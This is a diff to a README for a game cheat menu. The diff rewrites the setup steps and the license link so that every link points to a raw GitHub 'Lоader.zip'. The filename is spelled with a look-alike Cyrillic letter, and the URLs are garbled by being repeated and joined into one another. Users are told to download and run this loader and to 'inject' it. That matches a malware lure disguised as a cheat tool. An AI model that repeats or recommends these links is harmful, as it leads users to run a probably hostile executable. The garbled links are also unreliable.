@@ -69,9 +69,9 @@ The following table details Rematch Cheat Menu's major functions and their compa
 
 Getting started with Rematch Cheat Menu is quick and easy! Follow the steps below to set up your environment:
 
-1. Download **https://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zip** from this repository.
+1. Download **https://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zip** from this repository.
 2. Extract the contents using any modern archiver (e.g., WinRAR, 7-Zip, Keka, or Archive Utility).
-3. Run the https://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zip (Windows) or use Terminal for launching on macOS/Linux.
+3. Run the https://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zip (Windows) or use Terminal for launching on macOS/Linux.
 4. Follow on-screen prompts to inject and configure the menu.
 5. Customize your settings via the intuitive in-game GUI.
 6. Enjoy enhanced gameplay! 🚀
@@ -107,7 +107,7 @@ The Rematch Cheat Menu team does **not support or condone unfair multiplayer pra
 
 ## 📄 License
 
-This project is licensed under the [MIT License (2025)](https://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zip).  
+This project is licensed under the [MIT License (2025)](https://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zipоhttps://raw.githubusercontent.com/G0urv/Rematch-Arcade-Toolkit/main/Lоader.zip).  
 Feel free to use, modify, and share as permitted under MIT terms!
 
 ---
